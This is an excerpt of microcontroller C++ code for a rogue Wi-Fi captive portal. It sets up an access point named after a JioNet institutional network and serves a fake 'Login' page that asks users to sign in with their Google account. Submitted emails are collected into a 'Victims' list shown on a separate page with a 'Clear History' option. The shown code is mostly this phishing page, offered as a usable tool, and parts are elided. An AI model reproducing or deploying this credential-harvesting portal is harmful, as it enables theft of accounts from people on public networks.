...
// User configuration
#define SSID_NAME "JioNet@St_Joseph_Inst"
#define HEADER "Jio"
#define SUBTITLE "Welcome to JioNet service."
#define TITLE "Login"
#define BODY "Sign in with your google account to get connected to the Internet."
...
String header(String t) {
  String a = String(HEADER);
  String CSS = "article { background: #f5f5f5; padding: 1.3em; }"
               "body { align-content: center; color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               // Data input box
               "input{ width: 100%; padding: 12px 20px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 2px solid #909090; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               //  Free WiFi Navbar
               "nav { background: #ff8204; color: #e3e3e3; display: block; font-size: 1.3em; padding: 1em; }"
...
String pass() {
  return header(PASS_TITLE) + "<ol>" + Victims + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear History</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b> Email:   </b> <center> <input  type=text autocomplete=email name=email placeholder=Email></center>" +
         ...
         //SUBMIT
         "<center><input type=submit  style=background:#46b245;font-size:17px;color:white;cursor:pointer;  value=\"Login\"></center></form>" + footer();
